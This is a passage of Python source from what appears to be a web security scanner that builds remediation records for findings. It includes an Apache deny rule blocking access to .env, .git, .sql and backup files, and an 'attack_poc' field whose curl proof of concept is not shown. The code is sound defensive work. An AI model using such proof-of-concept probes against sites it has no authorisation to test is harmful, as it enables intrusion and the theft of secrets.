                <Files "{path.lstrip('/')}">
                    Require all denied
                </Files>
                # Or use FilesMatch for patterns:
                <FilesMatch "\\.(env|git|sql|bak)$">
                    Require all denied
                </FilesMatch>""")
            fix_language = "apache"
            fix_context  = ".htaccess"
        else:
            fix_snippet = (f"Remove {path} from the web server document root, "
                           f"or configure your web server to block access to it.\n"
                           f"Ensure .env, .git, backup files are never in a publicly "
                           f"accessible directory.")
            fix_language = "text"
            fix_context  = "Web server configuration"

        return {
            "finding_type":   vuln_type,
            "severity":       "High",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "curl",
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["Sensitive File Exposed"],
        }

    def _action_generic(self, vuln_type: str, severity: str,
                         location: str) -> Optional[Dict]:
        """Fallback for finding types without a specific handler."""
        return {
            "finding_type":   vuln_type,
            "severity":       severity,
            "location":       location,
            "attack_poc":     f"# Manual verification required\n# Location: {location}",
            "poc_type":       "none",
            "fix_snippet":    "# Consult the remediation section for fix guidance.",
            "fix_language":   "text",
            "fix_context":    "Application code",
            "effort_minutes": _EFFORT_MINUTES["default"],
        }

    # ------------------------------------------------------------------
    # Helper: language + context hints
    # ------------------------------------------------------------------

    def _fix_language(self, stack_key: str) -> str:
        return {
            "sveltekit": "javascript",
            "next.js":   "javascript",
            "express":   "javascript",
            "django":    "python",
            "fastapi":   "python",
            "nginx":     "nginx",
            "apache":    "apache",
            "generic":   "text",
        }.get(stack_key, "text")

    def _fix_context(self, stack_key: str, header: str) -> str:
        return {
            "sveltekit": "hooks.server.js or svelte.config.js",
            "next.js":   "next.config.js",
            "express":   "app.js / server entry point",
            "django":    "settings.py",
            "fastapi":   "main.py / middleware",
            "nginx":     "nginx.conf server block",
            "apache":    "httpd.conf or .htaccess",
            "generic":   "Web server / application configuration",
        }.get(stack_key, "Application configuration")